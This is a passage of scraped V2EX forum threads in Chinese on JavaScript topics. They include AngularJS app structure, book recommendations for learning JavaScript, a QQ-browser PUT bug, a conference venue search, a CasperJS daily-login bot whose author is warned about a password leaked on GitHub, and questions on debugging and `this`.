alt=\"暴走\"><br>\n答：纵观整个项目的生命周期，所有的directive不可能在初始便全部设计并构建好。请在项目进行的过程中，按需的增加或修改、丰富你的directive，不断提升你构建view的效率。</p>\n\n<p>依照上文构建与调用directive的经验。在实际项目中，我们在模块中需要10个ico，那么我们便在其模板中调用十次的&lt;ys-ico&gt;标签。</p>\n\n<p>那么前端工程师的问题又来了：“如果模块的交互需要弹窗，难不成我要先算好有多少个？然后全部先在模块里面声明，并使用ng-show=\"false\"全部隐藏起来？”<br>\n<img src=\"https://asset.ibanquan.com/image/54d0d0e74812f26d5f000005/18.png?v=1422971111\" alt=\"暴走\"></p>\n\n<p>Don't worry.不要被 <a target=\"_blank\" rel=\"nofollow\" href=\"http://stackoverflow.com/questions/14994391/thinking-in-angularjs-if-i-have-a-jquery-background\">Thinking-in-AngularJs</a> 限制了您的思维。换一个姿势 Thinking in jquery。<br>\n当我们需要一个弹窗的时候，按照往常的做法，便是在你页面架构预设好的位置（例如页面底部），插入弹窗的dom结构。<br>\n没错，弹窗还是这样实现，不同的是。我们插入的是弹窗的directive。<br>\n类似以下（简化代码未测试，仅为示例）：<br>\n<code><br>\n$('body').append($compile('&lt;ys-popwindow data=\"PopupModalData\"&gt;#{content}&lt;/ys-popwindow&gt;')($scope));<br>\n</code><br>\n我们通过动态插入directive解决了上面这个问题。但我总不能每个模块都写弹窗dom的插入吧。<br>\n这个时候，我们需要service。</p>\n\n<h1>公用的services</h1>\n\n<p>各种services为友好速搭店铺后台提供了统一的api接口调用，图像处理，弹层处理，实用工具等。<br>\n通过上面的目录，我们可以看到services文件夹下，有定义$Popup的Popup.js。<br>\n（简化代码未测试，仅为示例）<br>\n<img src=\"https://asset.ibanquan.com/image/54d0d0e84812f26c14000002/19.png?v=1422971112\" alt=\"service代码\"></p>\n\n<p>注入到您所需的模块后，愉快的调用吧！<br>\n<code><br>\n$Popup.modal({text : '弹窗标题'});<br>\n</code></p>\n\n<h1>用controllers组织业务</h1>\n\n<p>一切就绪，开始堆业务代码！<br>\n<img src=\"https://asset.ibanquan.com/image/54d0d0eaaaba8c6ceb000002/21.png?v=1422971114\" alt=\"用controllers图片\"><br>\n<img src=\"https://asset.ibanquan.com/image/54d0d641aaba8c70b6000002/22.png?v=1422972481\" alt=\"用controllers代码\"></p>\n\n<p>裸奔展示到此结束~有劳看官，若有任何错漏~烦请指正~</p>\n</div></div>"], "reply": "31", "tittle": "使用 AngularJS 从零构建大型应用", "comment": ["有点厉害", "Up+  ✧*｡٩(ˊᗜˋ*)و✧*｡", "不错哦， 有参考源码不", "收藏以备学习。有demo代码就好了。", "好文，可是我还没到那个境界看不懂", "不错~", "不错，弹窗那个思路挺好的。收藏。", "不错，高手作品", "这种应用好是好，让别人临时过来支持需求的时候成本太高了。", "很强啊，有这水平就不搞PHP了", "赞，我经常纠结 AngularJS 的文件和代码结构，这个可以作为一个不错的参考。", "这个应用应该还不算大", "赞~ 入门级 很好的例子", "还是不大敢拿AngularJs做大型应用", " \r", " \r", "可以参考准备工作第七点的项目地址～", " 恭请这位大大前来友好速搭体验一下～", " 临时支持的成本大部分还是在于对现有业务的理解～～", "点赞", " 大神可以推荐本书不，俺想尽快入门呢", "请问楼主有没有博客，累死的教程还有吗，非常想多学学", "点赞", " \r", "个人经历：\r", "官方例子+原理看完，ng-app跑起来。\r", "然后更多深入还是要通过项目需求来驱动啦。", "   \r", "\r", "             敢问兄台整套完成 耗时多久", " 向大大汇报，至今将近一年~~", "不错, 希望angular越来越多人用, 也欢迎大家体验一下我的angular应用, ", ", 微信公众号 附近八", "文件命名混乱，为啥不都是小写？", " ", " 从此参考延续下来的规则。项目经发布工具打包之后都为小写~谢谢提醒~", "我们项目也要用angularjs了", "不錯~ 我也在用 angularjs 。\r", "用 ionic 在公司寫 App ~ 速度還很快的。", "好腻害，学习啦，友好速搭也好强大", "好腻害~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>准备要学grunt的时候，gulp出来了<br>\n于是gulp + Browserify开始学习中。。。。<br>\n还没过几天就出来了个Broccoli + Duo<br>\n这，，，下一个什么时候出</p>\n</div></div>"], "reply": "40", "tittle": "前端啊 你慢些走 实在是跟不上了", "comment": ["珍爱生命 :)", "都是大同小异的，看一会儿就会了", "感觉本质上变化应该不大吧", "不奇怪啦，不光是前端，所有的技术都是这样的。概念就是要不停的推陈出新，其实内涵都大同小异。", "机械、建筑之类的一般变化比较慢，会AutoCad、SolidWork、UG之类的可以支持好几年或者好几十年，哈哈哈", "卤煮不学grunt了?", "webpack飘过", "vue.js  angular.js backbone.js各种js，楼主挺住", "先学一样，譬如 grunt，学到什么程度呢，到你觉得 grunt 各方面用的不爽，到你有能力为 grunt 改进的时候，再看其他，一通百通。\r", "至于其他的熟练度就跟使用频率有关了。\r", "\r", "千万别听人家说怎么怎么不好，另一个怎么怎么好，于是你就放弃之，学另一个，这样你永远跟不上节奏，永远都是浮于表面，永远都是半吊子。", "这几年就是前端发展快，没办法，越分离越复杂\r", "gulp比grunt清楚方便很多啊\r", "要怪就怪nodejs吧 T..T", "其实都差不多。。没必要什么都学\r", "主要是思想", " 遇到野生的xts", "珍惜生命 远离前端 前端毫无意义的坑是最多的", "你就跟了这些社区的而已- -ECMA + CSS + HTML的标准推进都让我吐血三升了……", "通读了the good parts后果断换typescript", " 遇到野生的 fc", " 楼主再看看这个", "跟不跟不是关键问题，关键问题是新技术是不是解放了你现有的生产力", "都是一些毫无意义的项目，带来的麻烦比好处多多了", " 别的不说，这个女忍者造型很不错，冲这个可以star一下", "backbone.js\r", "在线可编辑excel表格\r", "同无奈几乎每周都有新东西冒粗来，但项目中又几乎都用不到，不过是大家自己用来搞点东西装装13而已。嗯！少上微博就好了!", "认真学好原生javascript，css3等其他人写一大堆动画和创意再看不迟。\r", "html？一共才几个元素……\r", "\r", "btw：可以看coffeeacript。", "不是用多久学会的问题\r", "是用多久填坑的问题\r", "每一门新技术都是大坑小坑无数\r", "而公司往往初期舍不得投入\r", "等技术成熟了又马上就想吃个胖子\r", "\r", "这种事情太多了", " 少侠，coffeescript", " 亲，是typo……感谢修正。", " \r", "说的太好了，曾几何时我也一度追求流行框架，发现这就是个黑洞，永无休止。\r", "根本的解决方式就是先用语言原生的方法解决，这时你会发现语言你很多地方都不熟，JS更甚。自己遇到问题后先尝试自己解决，之后再去找相应框架，看看他是怎么解决的。", " 我恨你", "框架之类的太多了, 很多东西都功能是类似的, 其实说新技术根本也谈不上. 功能雷同的看1-2个够了. 不可能都放在一起用.", "跟我学数学吧。可用100年", "前段沉淀太少，php这样的都是站在巨人的肩膀上，有多少前端linux基本的命令都不知道，就是写写效果，追追潮流，当然这里说的是天朝的普通前端", "PHP站在巨人肩膀喷了", " 膜拜撸神！", "别人打发无聊玩的项目，何必跟那么紧", "这些工具随便看看文档，会用就行了，除非你很感兴趣它是怎么实现的，或者需要做插件之类的", "新东西就像几年前的ie6，是提升自己价值的一个筹码。", "这几天想找个mvvm框架看看，看见有angular backbone ember vue extjs avalon等等等，头好晕。。。", "lz教你，你自己想一套理论，开发成框架，然后学习各大框架的宣传方式，玩命宣传，让人家用你的东西。你就成功了。", "less, sass, stylus, angular, react, vue, bower, gulp, async, promise, restify... @", " 还有meteor\r", " 好像我能做出来似的"]},
{"content": ["<div class=\"topic_content\">先给兄弟姐妹们拜个年，祝大家羊年快乐！<br><br>最近想要换工作，跟老板聊的时候老板问起会不会JavaScript，所以最近在计划着有空学一学JavaScript。各位能不能介绍一下当时是如何入门的，读了一些什么书做了什么练习呢？</div>"], "reply": "60", "tittle": "JavaScript 要如何入门", "comment": ["就一条，善用搜索", " 之前也一直试着用搜索来学习新知识，但是对于一个全新的话题要怎么比较全面的入门呢？能不能分享一下经验？", "这必然不是新话题用站内搜索和 Google 选了几个链接 ", " ", "\r", "\r", "\r", "\r", "英语好的话可以看。14天免费。", "弄本靠谱的书系统学下", " 我也是这么想的，从上面的链接里得到了不少资源，不知道您有什么建议吗？", "把逼格降下来……\r", "看w3school", " 我也说不上有哪些书，搜到一博文转给你http://m.baidu.com/from=942g/bd_page_type=1/ssid=0/uid=0/pu=usm%400%2Csz%401320_1001%2Cta%40iphone_2_4.3_3_534/baiduid=D06E4C031BDA18422B8B851D602AE3C4/w=0_10_javascript%E4%B9%A6%E5%8D%95/t=iphone/l=3/tc?ref=www_iphone&lid=13361741211869315281&order=1&vit=osres&tj=www_normal_1_0_10_title&m=8&srd=1&cltj=cloud_title&dict=30&sec=1470&di=db302e7e872ee780&bdenc=1&nsrc=IlPT2AEptyoA_yixCFOxXnANedT62v3IEQGG_ytK1DK6mlrte4viZQRASDXwAinGUoCb9m3QgcVMhiGu0VAo7RF2u_9Ss7wq7Ufbdenq6RO1HRAPfANq1sL4V_", "好吧，说点实际的。学 JavaScript 我走过不少弯路，就看书来说，由于前端更新的很快，旧的没必要看了， Javascript 高级程序设计比犀牛适合入门，然后蝴蝶犀牛，其他的有精力再看吧，写东西。漏了一个去年在用的好资源 ", "\r", "W3school 因为之前有不少错误，所以喷的人较多，这两年改了多少不确定，反正国内那个和国外的 w3school 都不算权威资料", "弱弱的问一句，啥叫会。最简单的调onclick方法也是js。复杂的angularjs也是js。", "javascript不等于jquery 也不等于前端\r", "\r", "单独学最好", "直接撸项目是最好的学习途径。\r", "语言本身没什么好学的，当然除非这是你第一门语言。", " 您给的链接非常适合初学者入门，谢谢！", " 谢谢，我有一点C++/Python的基础。我想换了工作之后马上就有机会接触真的项目啦。", " 纯算法代码 javscript和c＋＋几乎无需更改", " 恩，我想我主要需要学习一下DOM等Web开发的基本概念。", "不知道你是要写前端还是后端？\r", "前端的 js 基本都是围绕 dom 在展开，后端的 js 基本就是 Node.js / io.js 了。\r", "\r", "如果要了解 js 的语法、特性、坑的话，可以看看 《JavaScript语言精粹》。\r", "如果是前端的 js 的话，可以看看 《JavaScript DOM编程艺术》，接触一下原生的 dom 操作，对以后写前端很有帮助。\r", "如果是后端 js 的话，入门书好像不多，朴灵的那本《深入浅出Node.js》感觉不适合入门，反而那些《Node.js实战》可能看起来会简单点。\r", "\r", "之后就是各种库的使用了，那个阶段你直接看官方文档就行了。", " dom htl/css简单使用范围有限\r", "javascript可以上天入地下海 无所不能", "javascript dom编程艺术\r", "javascript 高级程序设计\r", "javascript good parts （蝴蝶书）\r", "javascript web富应用开发（猫头鹰书）\r", "\r", "从上倒下依次刷", "一边学一边用", "阮一峰", "javascript是最简单的语言，不是语言多简单，是资料实在太丰富了，随便一个特性，网上的资料都一堆。所以说是最好学的。", "自己整理的资料，质量一般，可以作为入门材料 \r", "\r", "JS 核心\r", "\r", "浏览器端\r", "\r", "服务端\r", "希望对你有用 转「译」如何正确学习JavaScript\r", " 我就是按照20L说的这么刷的。", "先整明白正则…… 我觉得最难搞就是这个", " 整明白这个也入不了门啊, 毕竟楼主需要的是入门", "感觉每隔一段时间都会有这个问题，已经被问烂了，知乎上一搜一大把。", "我是从http://www.w3school.com.cn/ 上入门的，然后用chrome的控制台多试验几次，基本上就能搞懂了。再自己弄个项目练练手。自我感觉现在是刚入门的状态吧。\r", "然后有几个概念比较难理解，闭包和promise。闭包现在基本上弄懂了，promise刚接触，还没弄明白。", " 不能这么说，需要本身的掌握对将来的学习决定有好处的。至少要理解js的类，继承，闭包，自己一些将来的比如promise什么的，不然后面学习会有坑", "建议以最快的速度去玩 js 库和框架，包括 gulp 这类工具\r", "\r", "\r", " 你看哪本书学习的?", "知识面要广。", "感觉JS比Java还难,楼主最好别碰,会被坑死", "对于如何选择材料，推荐 walkthrough + cookbook 之类的东西，上手快\r", " \r", "\r", "这篇文章也可能能启发一下您的总体学习思路 ( 不单单对于 js 这门语言 ) ，千万不要低估自己的学习能力。\r", "\r", "\r", "《JavaScript DOM编程艺术》是很多人推荐JavaScript入门的第一本书，这是一本优点与缺点同样明显的书，优点是够简单，主要都是讲浏览器端与DOM相关的JavaScript，方便你quick & dirty地开始；缺点是对JavaScript语法的讲解非常缺乏，书中甚至有一些JavaScript的反模式（如给setTimeout传字符串而不是函数引用）。\r", "《锋利的jQuery》是难得的国产好书，讲的是jQuery库的入门，看完这本书你应该能高效地处理浏览器端的脚本了。\r", "一直到《JavaScript高级程序设计》才比较系统地讲到JavaScript的本质，包括数据类型、函数、数列、原型继承、闭包等JavaScript独有的概念，当然也包括浏览器端的脚本处理。\r", "\r", "之后就可以自己随便看点什么了，包括订阅博客、看官方文档什么的。", "看书的本质是求知，最最重要的是要自己多写，多看看别人代码是怎样实现，单看书没用。", " 不放到工程的背景里去学OOP一套东西，很容易就会染上过度设计的毛病\r", "不放到工程背景里去看闭包、promise，可能纠结N久都对这两者真正的意义和作用似是而非\r", "\r", "花30分钟大概看下JS的language spec，搞定语法直接开始撸项目\r", "项目经验告诉我需要用OOP，查文档花5分钟就能学会JS的OOP\r", "项目经验告诉我需要用FP、lambda之类的东西，查文档花5分钟就能知道JS闭包的存在\r", "撸项目遇到了callback pyramid of doom，查文档花5分钟就能知道promise的存在\r", "项目撸完，知识点差不多覆盖完，还有第一手的实践经验。\r", "可能别人才看完教材，正在纠结第一个类要怎么命名才好。\r", "\r", "按教材顺序线性学习不仅事倍功半，还不易于直接和你已有的知识体系融合，大量新技术没教材怎么办？\r", "找个项目来做，启发式的寻找解决方案，学到的东西才牢固", "可以从jQuery入手，尝试自己实现一些常见效果，比如内容折叠，TAB切换，幻灯片", " 同意！但是我有个后续的问题，你提到了项目是关键，但如何找到一个合适能够涵盖到这些知识点的项目呢？就拿我自己来说吧，当时学Rails的时候也是通过项目上手，做了个类似留言板（感觉学web框架不少都是用留言板练手的 :），基本知识都通过实践了解了，但是由于视野窄，就深入不下去了，回到JS，譬如我用JS做个什么小项目，最主要的时候是凭我对JS的肤浅了解，根本就用不到FP、lambda、promise这些知识到项目中，导致练来练去还是CRUD...望指点！", "mdn 觉得是个很权威，很好的网站。", " 阮一峰的书说实在的 不是特别适合看。总感觉很怪。", " 要根据自己的情况循序渐进，有时候一个项目覆盖不完所有知识点很正常，多撸几个就行，而且项目太大超出自己的能力范围很容易烂尾。\r", "要提升的话，找人做code review，多看别人的代码，看下别人是怎么实现同样的功能的，然后再试着重构自己的项目。\r", "还有就是看一些框架的源码，尝试做一个粗略的clone版，实现核心功能达到学习目的就行。\r", "如果做了N个项目还是感觉在撸同样的内容的话，就要think out of box，尝试去做一些没人做/极少人做的东西。", " 阮老师的文章要配合朴灵的“注解”看，你懂的。他翻译的《黑客与画家》还不错", " 这个推荐是有点问题的，《JavaScript权威指南》不适合初学看，作为第一本不合适。《JavaScript高级程序设计》虽然名字带“高级”，基础和细节讲得更好，第三版翻译的还可以，我始终觉得对象和函数部分，高程要讲的比权威指南好", " 我明白你的意思了。不过我要说这样学习比较适合有编程基础的，最好有oop编程基础。不然当他们遇到这样的需求可能会根本想不到这个概念，从而踩到一个深坑里面去。所以我比较建议在使用一门技术或一门语言时至少通览一遍概念。\r", "\r", "目前我个人也是你这样的学习方式，但是不知道题主是什么样的状态？", "javaScript 需要学？？//就当我没说过\r", "\r", "我总觉得javaScript是语法最简单最混乱的语言，随便怎么写都是对的。。呜呜\r", "\r", "有一点OOP基础，什么都好办～～～", "我是在w3school入门的，虽然讲解不深，但简单明了的例子和亲自参与实践，绝对比一本厚重的书有吸引力。入门了再看书补习啦。", "有没有 OOP 你都要踩坑，传统的 OOP（如Java） 基于类的继承，JS 基于原型继承。而且 JS 的函数用法要比 C、Java 灵活，这也是坑的来源之一，刚开始觉得各种诡异风格那真是恶心", " 所以我说“除非这是第一门语言”嘛。\r", "而且学习方法也并不是非此即彼的，lz可以根据自己情况决定预备知识要学到个什么程度再开始撸代码。\r", "一般有点基础的，都没太大的必要把教材全啃完再动手。", "在说JS之前……\r", "也许可以先看看这个CSS\r", " 恩，其实第一门语言或者换个说法，编程基础还是非常重要的。有这个基础后面学习其他技术速度那是飞起来的", "1. 少走弯路，[《如何正确学习 JavaScript 》](http://www.crimx.com/2014/05/15/how-to-learn-javascript-properly/)\r", "2. 善用（google）搜索，会用英文，会在关键字后面加上 mdn\r", "3. 键盘啪啪啪，练习不能停", " 能解释一下为什么js无所不能吗？是因为node.js有很强大的能力吗？", " 谢谢，我刚刚略读了DOM编程艺术和蝴蝶书，有了一些感觉，打算上手试一试，谢谢你！", " \r", "桌面（qml msjs） 移动（appcelerator msjs） 游戏（cocosdxjsb unityscript） 服务器（nodejs）嵌入（tessel）测试（appleuiautomation telerikjs）nosql mapreduce（mongodb couchdb）大数据算法hadoop mapreduce（ms的hdinsight javascript）\r", "\r", "都是javascript\r", "谁能更广泛？\r", "\r", " 呵呵 吼吼", "JavaScript权威指南\r", "JavaScript语言精粹\r", "多时间,多写代码才是王道", "javascript是偶目前见过的唯一一种 框架会对语言产生干扰的语言\r", "这也能解释为何很多前端会jquery但写不好javascript\r", "\r", "谨慎用框架 搞不好就蹉跎岁月浪费生命"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我在测试的时候使用model.save()进行update的时候，会使用http的put方法，model的内容在request的body中上传到服务器，但是在qq浏览器中，该方法的request中的body为空，这是长存在的问题么，应该如何解决呢</p>\n</div></div>"], "reply": "3", "tittle": "backbone.js 在 qq 浏览器 5.7 中 put 方法问题", "comment": ["已解决，通过兼容模式解决了，可能qq浏览器就不支持put方法", "我都用post get 顶替put delete", " 嗯，我也是这么解决的，不过到现在qq浏览器居然不支持put，delect，挺费解的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我们正在筹划2015年的<a target=\"_blank\" rel=\"nofollow\" href=\"http://2015.jsconf.cn/\">JavaScript中国开发者大会</a>,现在正在寻找一个能够容纳500+观众的场地.</p>\n\n<p>对场地的基本要求就是要<strong>交通便利</strong>,<strong>网络条件良好</strong>,能够装的下<strong>足够多</strong>的热情的JavaScript开发人员.</p>\n\n<p>可以是大公司的<strong>会议室</strong>, <strong>大型酒店</strong>(费用较高..), <strong>大学</strong>(场地大小可能不够, 日程..), <strong>海边</strong>(不是没有可能...)</p>\n\n<p><strong>深JS</strong>——2015 JS中国开发者大会是一场专注于JavaScript和Node.js技术，为期两天的国际性技术大会。届时，大会会邀请国内外的优秀讲师为大家分享在JavaScript和Node.js技术方面的经验。继上海，北京和杭州之后，JS中国开发者大会将于2015年夏天在深圳召开。</p>\n\n<p>活动地址定在了深圳, 请问各位V友有没有什么好的<strong>场地</strong>可以推荐?</p>\n\n<p>我们在活动的Github创建了一个issue正在讨论, 欢迎在这里或者前往Github提供线索! <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/jsconfcn/ShenJS/issues/1\">https://github.com/jsconfcn/ShenJS/issues/1</a></p>\n\n<p>如果你能认识<strong>相关人员</strong>让我们联系也可, 不胜感激!</p>\n</div></div>"], "reply": "12", "tittle": "[深 JS]JavaScript 中国开发者大会场地意见", "comment": ["希望大家能够多多提提意见，:)", "腾讯大厦不是经常有类似活动么？基本满足你的要求。", " 请问有相关人员的联系方式或者之前举办活动的链接么? 对那边不是很熟哦.", "我今天肯定要去。", " 今天去不了 今年可以去 哈哈", "楼主的需求，可以找yunspace.com.cn解决", "亚马逊上次在科兴科技园搞了广告大会，楼主可以考虑那里。直接就在科技园，一支穿云箭。", " 请问可以具体点么?具体是科兴科技园哪里? 可以联系谁?", "深圳科兴科技园国际会议中心。。。\r", "上会亚马逊开安利大会的地方，在深大地铁站附近，步行过去15分钟内。\r", "联系人你问我也不知道啊。。。。我就去玩了一次。。。\r", "\r", " o(>﹏<)o手误。", "会议什么时候开啊？", " 今年夏天. 大概七月份. 正在紧张的筹办当中."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在这里，你可以遇到最给力的开发小伙伴！ 最牛逼的产品经理！ 和最萌萌哒的设计MM！<br>\n在这里，你还可以发现最卓越的架构设计，最走心的开发实践！<br>\n我们提供丰厚的薪资回报，只待你的加入！ 简历至： <a target=\"_blank\" rel=\"nofollow\" href=\"mailto:151232634@qq.com\">151232634@qq.com</a> 或 <a target=\"_blank\" rel=\"nofollow\" href=\"mailto:jerryhcliao@tencent.com\">jerryhcliao@tencent.com</a></p>\n\n<p>[BASE深圳]  、 [精通 H5、JS、CSS]  、 [有使用NodeJS经验者优先~] 、 [有想法、有实践、有激情或者有基情的都可以~]</p>\n</div></div>"], "reply": "8", "tittle": "[腾讯招聘] 前端小伙伴，欢迎加入~", "comment": ["应届好么 OwQ...", "H5是什么喵", " hi5 贝多芬第五交响曲", "够不着啊，几年前发了没消息，当然， 我没本科", "  就是HTML5哈~", "css精通,起码要3年以上经验吧?", "H5 啊！", "唉。。。。 有木有人愿意来试试么。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>使用 JS 写的机器人自动登录领取 v2ex 的登陆奖励分</p>\n\n<p>需要安装 casperjs，js文件里面29,30行需要改成自己对于的账户和密码</p>\n\n<p>每天自动登陆领取奖励，发布时间轴日志，其他记事本之类，包括发帖一样能实现的</p>\n\n<p>求别封号！！！</p>\n\n<p>地址： <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/jiehuangwei/js\">https://github.com/jiehuangwei/js</a></p>\n</div></div>"], "reply": "27", "tittle": "使用 JS 写的简单机器人自动登录领取 V2EX 的登陆奖励分", "comment": ["neng", "能多账号吗？", "问问积分有啥用？", "   多账号需要修改下代码\r", "  积分没啥特别的用处，做个机器人的例子而已，其他类似的，比如微博自动登录，自动发博等，一样的道理，能简单实现", "马克吐温", "搞成chrome插件形式如何？或者tampermonkey", " 好主意，我去研究下", " 已经有了“V2EX自动领取每日签到登录奖励”\r", "[", " \"V2EX自动领取每日签到登录奖励\")", "/raw/a37d61818b64654274dff5aabe9687d600f82d51/v2ex_daily_mission.user.js", " 这个要怎么用", "怎么没法爬啊啊啊啊啊", "想请教下casperjs安装后怎么用，把这个脚本放到油猴扩展里面就能用吗？", " 我这个不是浏览器插件，需要再命令行下面运行，或者作为定时任务\r", "\r", "安装完 casperjs 修改完账号密码后 命令行下面 casperjs v2ex.js 回车就能运行", " 恩，感谢，去了解下，是基于phantomjs类似于在命令行模拟浏览器操作的赶脚。。我真是孤陋寡闻，只知道node.js 233", " 嗯，在cli下模拟的浏览器内核，主要用于自动化测试，也可以抓取，采集一些比较复杂的数据，特别是一些加密异步输出的数据", " 还想请教下这个和node.js的使用情景的区别，主要是node.js也是在命令行跑的，能不能简单地理解为phantomjs是模拟浏览器在命令行中进行自动化的批量js操作，而node.js 是为了将js从浏览器环境中分离出来做更多的事情呢？", " node我没用过，貌似主要用于web server 和 data api，phantom 主要用于 测试，程序截屏，页面自动化和监控，什么样的情景选择什么样的工具，没有定论，关键在于合适和效率\r", "\r", "v2ex 好像被墙了，只有 https 能访问", " 你看置顶。。", "CasperJS 能在浏览器和nodejs跑吗\r", "现在一看框架就头大", " 可以回帖用的。。\r", " 你github把自己密码泄露了", " 哦，不小心提交了，已修改，谢谢", " 不客气，建议还是修改下密码吧。", " 建议你修改所有密码，我都忍不住要扫你账户了", "github就这点不好，不小心把密码泄露了就不好删……", "  谢谢提醒，已删去密码，一个不小心，这玩意就有点危险啊，得搞个本地的配置文件", " \r", "我是说你邮箱，QQ，天涯，贴吧，人人……凡是用到这个密码的都不能不改……\r", "社会工程学不是用来吓唬人的……"]},
{"content": ["<div class=\"topic_content\">ES6 已经停止接收草案 , 最终发布时间拟定为 2015年6月 , 看起来好像就剩三个月了 ( 泪目<br>Babel 是一个相对来说比较出色的 Javascript Transpiler , 可以帮助你提前体验下一代 JS<br><br>Babel 上有一个 <a target=\"_blank\" href=\"http://babeljs.io/docs/learn-es6/\" rel=\"nofollow\">http://babeljs.io/docs/learn-es6/</a>  , 介绍最新的特性<br>这两天我粗略翻译了一下这份特性文档 , 补充了一些资料 , 欢迎大家拍砖 : )<br><br><a target=\"_blank\" href=\"https://github.com/lenville/es6features\" rel=\"nofollow\">https://github.com/lenville/es6features</a></div>"], "reply": "7", "tittle": "ES6 Features 中文版", "comment": ["楼主辛苦 Star 敬上", "started", "Non-breaking additions to support full Unicode\r", "\r", "你的第二种解读是对的。", " \r", " \r", " \r", "\r", "谢谢大家 !", "Star 和 感谢已发送~", "前几天在github上看到阮一峰写的开源书，也是关于ES 6的。http://es6.ruanyifeng.com/", " \r", " \r", "感谢 !\r", "阮老师的书写了有一阵儿了 , 有些新特性没有加进去\r", "我这两天再把手头的资源整理出来 , 先开个坑\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比例优先，大小排其次</p>\n</div></div>"], "reply": "6", "tittle": "如何判断两张图片的大小比例相似度？", "comment": ["没研究过 大概 php 好像可以用getimagesize获取宽度和高度  然后计算比例\r", "相似度 可以感觉可以参考ae高反差保留的算法 不过不开源好像", "opencv", "image对象\r", "\r", "自己根据宽高度来判断就行了吧.", "能具体说明一下吗？\r", "因为不是特别了解lz需求，稍微提几点：\r", "1. 宽高比\r", "2. 仿射变换", " 不是这个意思，重点是得出一个相似度的参考值"]},
{"content": ["<div class=\"topic_content\">比如在输入框输入v2ex，点按钮就能打开https://www.v2ex.com/</div>"], "reply": "6", "tittle": "如何用 Javascript 写一个小程序，输入框输入一段文字点按钮就能打开一个网站(文字和网站已经预先配对好)？", "comment": ["这不是很easy吗？学过javascript的应该都会把", " 我不会，教教我", "<?php\r", "$php是最好的语言=1;\r", "if ( $php是最好的语言==1 && isset($_GET[\"site\"]) && $_GET[\"site\"] == \"v2ex\" ) header(\"Location: ", ");\r", "?>\r", "<form>\r", "<input name=\"site\">\r", "<input type=\"submit\">\r", "</form>", "<script>\r", "var keyword = document.getElementById('keyword').value.trim();\r", "window.location.assign(\"http://www.\"+keyword+\".com\");\r", "</script>", " \r", " 最好写成带按钮的，用Javascript。不光有v2ex网站，还希望有engadget之类的网站，还希望支持中文，比如输入瘾科技能打开cn.engadget.com\r", "\r", "<!DOCTYPE html>\r", "<html>\r", "<body>\r", "\r", "<button onclick=\"myFunction()\">button</button>\r", "\r", "<script>\r", "function myFunction() {\r", "window.open(\"http://www.v2ex.com\", \"_self\");\r", "}\r", "</script>\r", "\r", "</body>\r", "</html>", "这种问题去百度知道就行了。。。"]},
{"content": ["<div class=\"topic_content\">我有一段简单的jQuery deferred object的代码（如下），我在resolve() 被调用时设置了个断点，本想看看resolve()后会执行什么（期望是执行done() 方法（可能我对deferred的理解也不准确）），但关键我step over (F10) 后就直接被跳到jquery框架代码了，直到call stack所有的call都pop完了都没有来到done() 那里...js新手完全不知道怎么debug js代码啊，面对框架代码就瞎了（对debug也是正在学习中，可能这里不应该step over？），还请大人指点一二<br><br><a target=\"_blank\" href=\"http://jsfiddle.net/turtlemonvh/sszEd/\" rel=\"nofollow\">http://jsfiddle.net/turtlemonvh/sszEd/</a><br><br><img src=\"http://ww4.sinaimg.cn/large/dd266435gw1epwxrbi1ozj218c0krtel.jpg\" class=\"imgly\" style=\"max-width: 660px;\" border=\"0\"> \n<br><img src=\"http://ww2.sinaimg.cn/large/dd266435gw1epwxrtctzhj214w0cvwiq.jpg\" class=\"imgly\" style=\"max-width: 660px;\" border=\"0\"> </div>"], "reply": "10", "tittle": "请问应该如何有效的 debug javascript 代码呢，我设的断点下一步直接调到框架代码中去了", "comment": ["对，这里应该钻入（f11），也就是进入resolve的实现内部\r", "\r", "然后你会看到defer实现的若干调用，一直钻下去到$.Callbacks的部分应该就能断到业务的回调了", " 果然是！感谢mcfog，钻入是钻到当前调用方法的具体实现，而step over是跳到callstack的下一个方法，我的理解没有错吧？钻进去看到的代码头都大了，最主要是里面方法的参数全是字母...不是说方法名应该descriptive吗...", "把 jQuery.min.js 换成 jQuery.js 看着会舒服些。", "最好别用框架\r", "那些都是吧简单的事情搞复杂的人混饭吃的\r", "\r", "html＋ccc＋javascript就是前端终极框架", "html＋css＋javascript就是前端终极框架", " 原本也想过但有太多轮子要造了，再不用别的，也用用jQuery吧 :)", " 会吗？我看到在调试窗口里面点 { } 按钮能把压缩了空格换行的代码重排复原的", " 会，那样你看到的代码变量名不会是 a,b,c,d,e", " 这还真不知道，感谢告知！我马上跑去看看！", " jquery是库不是框架 可用\r", "\r", "angular那些框架其实多是废物"]},
{"content": ["<div class=\"topic_content\">楼主是通过Python自学入门的编程，在Python中，按我有限的了解，this是在OO的场景下使用，指的是对象本身，来到了JS，this满天飞，而且不是指的‘对象’本身，我也看过一些资料，了解this需要先了解runtime context，谁call的这个方法，这个this就是指的那个caller，这样理解对吗？<br><br>如果上面的理解正确，那看别人代码大概能看懂this了，自己写的时候就又头大了，什么时候需要用this呢？感觉js中面向对象和函数式编程混着，太难了...</div>"], "reply": "19", "tittle": "JavaScript 的 this 让人很困惑，到底什么时候该用 this 呢？", "comment": ["this 不是自己的意思_(:з」∠)_\r", "\r", "好像 stackoverflow 上有不錯的回答", "js的this还不算难理解吧。ruby元编程的时候，self才真正满天飞。", " \r", "\r", "了解this需要先了解runtime context，谁call的这个方法，这个this就是指的那个caller，这样理解对吗？\r", "\r", "对\r", "\r", "结合that看一下就好了\r", "\r", "：－）", "js的函数和python里面这点还挺像的，就是函数可以套在任何一个对象上执行。\r", "\r", "python的话就是第一个参数,约定俗称叫它self,但self并不是关键字，换成其他的一样运行。\r", "\r", "js的this和python里面的self一个效果，就是当前函数操作的对象，也就是套的对象，现在这个函数套在这个对象上执行。只不过this在js里是关键字，是隐含的。", "this 指向通過「a.b()」調用的 a\r", "\r", "推荐阅读《JavaScript 高级程序设计》 比你在这问有效", "this 有三种用法\r", "\r", "```javascript\r", "\r", "function fn() {\r", "  alert(this.something);\r", "}\r", "\r", "something = \"global\";\r", "obj = {\r", "   something: \"object\",\r", "   method: fn\r", "};\r", "\r", "fn();                  //global\r", "obj.method();    //object\r", "var 